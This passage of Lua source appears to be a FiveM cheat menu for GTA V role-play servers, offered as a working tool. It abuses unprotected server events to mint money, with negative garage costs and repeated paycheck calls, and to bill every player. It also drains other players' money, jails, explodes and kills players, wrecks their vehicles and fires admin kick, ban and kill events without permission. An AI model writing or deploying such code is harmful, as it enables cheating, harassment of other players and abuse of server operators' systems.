				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
			elseif gesraGSRKGoiwsrrswg.Button("~s~Bank ~r~~h~Deposit") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
				if result then
				TriggerServerEvent("bank:deposit", result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~s~Bank ~r~~h~Withdraw ") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
				if result then
				TriggerServerEvent("bank:withdraw", result)
				end
			end


			gesraGSRKGoiwsrrswg.Display()
				elseif gesraGSRKGoiwsrrswg.IsMenuOpened("ESXMisc") then
				    if gesraGSRKGoiwsrrswg.Button("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
                    local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
                    for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                    end
				end
				elseif gesraGSRKGoiwsrrswg.Button("~g~~h~ESX ~w~Get all licenses Drive") then
					TriggerServerEvent('esx_dmvschool:addLicense', dmv)
					TriggerServerEvent('esx_dmvschool:addLicense', drive)
					TriggerServerEvent('esx_dmvschool:addLicense', drive_bike)
					TriggerServerEvent('esx_dmvschool:addLicense', drive_truck)
					TriggerServerEvent("dmv:success")
				elseif gesraGSRKGoiwsrrswg.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif gesraGSRKGoiwsrrswg.Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end
				

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("MiscServerOptions") then
				if gesraGSRKGoiwsrrswg.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif gesraGSRKGoiwsrrswg.Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("VRPOptions") then
				if gesraGSRKGoiwsrrswg.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Wpisz kwote pieniedzy USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif gesraGSRKGoiwsrrswg.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Wpisz kwote pieniedzy USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif gesraGSRKGoiwsrrswg.Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif gesraGSRKGoiwsrrswg.Button("~r~~h~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif gesraGSRKGoiwsrrswg.Button("~r~~h~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
			end


				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("ESXDrugs") then
				if gesraGSRKGoiwsrrswg.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~w~Sell ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~g~Money Wash ~c~(x10)") then
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif gesraGSRKGoiwsrrswg.Button("~r~~h~Stop all ~c~(Drugs)") then
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					drawNotification("~r~Everything is now stopped.")
				end
				
				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("RecrutarPlayers") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and gesraGSRKGoiwsrrswg.MenuButton("~h~~r~-»  ~s~"..GetPlayerName(i).."", 'RecrutarPlayersOptions') then
						SelectedPlayer = i
					end
				end
				
				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("RecrutarPlayersOptions") then
				gesraGSRKGoiwsrrswg.SetSubTitle("RecrutarPlayersOptions", "Recrutar Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
			    if gesraGSRKGoiwsrrswg.Button("~s~Recruit~c~~h~ Mechanic") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
				TriggerServerEvent('esx:recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
			elseif gesraGSRKGoiwsrrswg.Button("~s~Recruit~b~~h~ Police") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "police", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "police", 0)
			elseif gesraGSRKGoiwsrrswg.Button("~s~Recruit~c~~h~ Mafia") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "mafia", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mafia", 0)
			elseif gesraGSRKGoiwsrrswg.Button("~s~Recruit~p~~h~ Gang") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "gang", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "gang", 0)
			elseif gesraGSRKGoiwsrrswg.Button("~s~Recruit~r~~h~ Inem") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
			elseif gesraGSRKGoiwsrrswg.Button("~h~Custom Recruit") then
					local reason = KeyboardInput("Enter the job name", "", 100)
					local reason2 = KeyboardInput("Enter the nivel job number 0-10", "", 10)
					if reason and reason2 then
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), reason, reason2)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer',GetPlayerServerId(SelectedPlayer), reason, reason2)
					end
				end

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and gesraGSRKGoiwsrrswg.MenuButton("~h~~r~-»  ~s~"..GetPlayerName(i).."~h~~y~ » "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~s~[~r~DEAD~s~]" or "~s~[<FONT COLOR='#f3ff45'>ALIVE~s~]"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
		

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("PlayerOptionsMenu") then
				gesraGSRKGoiwsrrswg.SetSubTitle("PlayerOptionsMenu", "~h~Player ~s~~r~[" .. GetPlayerName(SelectedPlayer) .. "~r~]")
				if gesraGSRKGoiwsrrswg.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
					SpectatePlayer(SelectedPlayer)
				elseif gesraGSRKGoiwsrrswg.Button("Teleport To Player") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)	
				elseif gesraGSRKGoiwsrrswg.Button("~g~Give ~s~Money") then
						local result = KeyboardInput("Wpisz kwote pieniedzy by dac", "", 100000000)
						if result then
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
				elseif gesraGSRKGoiwsrrswg.Button("~r~Remove ~s~Money") then
						local result = KeyboardInput("Wpisz kwote pieniedzy by zabrac", "", 100000000)
						if result then
						TriggerServerEvent('esx:removeInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
				elseif gesraGSRKGoiwsrrswg.Button("~r~Explode") then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
				elseif gesraGSRKGoiwsrrswg.Button("~g~Revive ~g~ESX") then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
				elseif gesraGSRKGoiwsrrswg.Button("~g~Revive ~b~VRP") then CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif gesraGSRKGoiwsrrswg.Button("Give ~b~Armour ") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif gesraGSRKGoiwsrrswg.Button("~h~~r~Kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 
				elseif gesraGSRKGoiwsrrswg.Button('Fire') then
				    uoityuNUJHTMHnthijNH(SelectedPlayer)
					elseif gesraGSRKGoiwsrrswg.Button("Jail") then		
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(SelectedPlayer), 45 * 60, "dude weed")
				elseif gesraGSRKGoiwsrrswg.Button("Unjail") then
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
				TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
				TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))	
				elseif gesraGSRKGoiwsrrswg.Button("~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif gesraGSRKGoiwsrrswg.MenuButton("Weapon Menu", "SingleWepPlayer") then
				elseif gesraGSRKGoiwsrrswg.Button("Spawn Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)

					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
					else
						drawNotification("~r~Model nie istnieje!")
					end
				elseif gesraGSRKGoiwsrrswg.Button("Cuff ~g~ESX") then
					TriggerServerEvent("esx_policejob:handcuff", GetPlayerPed(SelectedPlayer))
					elseif gesraGSRKGoiwsrrswg.Button("~h~~b~--Vehicle Options--") then
				elseif gesraGSRKGoiwsrrswg.Button("~b~Kick Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
				elseif gesraGSRKGoiwsrrswg.Button("~b~Fuck Engine ~r~NEW") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleUndriveable(GetVehiclePedIsIn(playerPed),true)
					SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 100)
 
				elseif gesraGSRKGoiwsrrswg.Button("~b~Napraw Pojazd ~r~NOWE") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
 
				elseif gesraGSRKGoiwsrrswg.Button("~b~Rozjeb Samochod ~r~NOWE ") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
						StartVehicleAlarm(playerVeh)
						DetachVehicleWindscreen(playerVeh)
						SmashVehicleWindow(playerVeh, 0)
						SmashVehicleWindow(playerVeh, 1)
						SmashVehicleWindow(playerVeh, 2)
						SmashVehicleWindow(playerVeh, 3)
						SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
						SetVehicleDoorBroken(playerVeh, 0, true)
						SetVehicleDoorBroken(playerVeh, 1, true)
						SetVehicleDoorBroken(playerVeh, 2, true)
						SetVehicleDoorBroken(playerVeh, 3, true)
						SetVehicleDoorBroken(playerVeh, 4, true)
						SetVehicleDoorBroken(playerVeh, 5, true)
						SetVehicleDoorBroken(playerVeh, 6, true)
						SetVehicleDoorBroken(playerVeh, 7, true)
						SetVehicleLights(playerVeh, 1)
						Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
						SetVehicleNumberPlateTextIndex(playerVeh, 5)
						SetVehicleNumberPlateText(playerVeh, "GEJ")
						SetVehicleDirtLevel(playerVeh, 10.0)
						SetVehicleModColor_1(playerVeh, 1)
						SetVehicleModColor_2(playerVeh, 1)
						SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
						SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
						SetVehicleBurnout(playerVeh, true)
						drawNotification("~g~Pojazd Rozjebany!")					
				elseif gesraGSRKGoiwsrrswg.Button("~r~MelloTrainer ~s~KILL") then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
				elseif gesraGSRKGoiwsrrswg.Button("~r~MelloTrainer ~s~BAN") then
					TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
				elseif gesraGSRKGoiwsrrswg.Button("~r~MelloTrainer ~s~KICK") then
					TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "Kicked: You have been kicked from the server." )
					TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(SelectedPlayer), "ALE GEJ" )
					end
				
			
				

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("SingleWepPlayer") then
				for i = 1, #allWeapons do
					if gesraGSRKGoiwsrrswg.Button(allWeapons[i]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
					end
				end

				gesraGSRKGoiwsrrswg.Display()
			elseif IsDisabledControlPressed(0, 313) then
				gesraGSRKGoiwsrrswg.OpenMenu("MainMenu")
			end

			Citizen.Wait(0)
		end
	end
)

RegisterCommand("killmenu", function(source,args,raw)
	Enabled = false
end, false)
